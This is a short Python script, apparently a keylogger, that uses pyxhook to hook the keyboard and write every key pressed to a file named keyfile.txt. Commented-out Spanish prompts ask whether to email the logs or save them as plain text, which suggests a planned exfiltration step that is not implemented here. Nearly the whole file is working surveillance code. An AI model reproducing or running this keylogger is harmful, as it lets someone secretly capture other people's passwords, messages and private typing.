import pyxhook

respuesta_afirmativa = ("yes", "y")

def oneKeyEvent(event):
    with open("keyfile.txt", "a") as logKey: 
        try: 
            logKey.write(f"{event.Key}\n")
            return True
        except: 
            return False 

def callback():
    hm = pyxhook.HookManager()
    hm.KeyDown = oneKeyEvent
    hm.HookKeyboard()
    hm.start() 
     
if __name__ == "__main__":
    # enviar = input("¿Deseas enviar los registros por email?[y/n]") in respuesta_afirmativa  
    # guardar = input("¿Deseas guardar los registros en texto plano?[y/n]") in respuesta_afirmativa
    
    callback()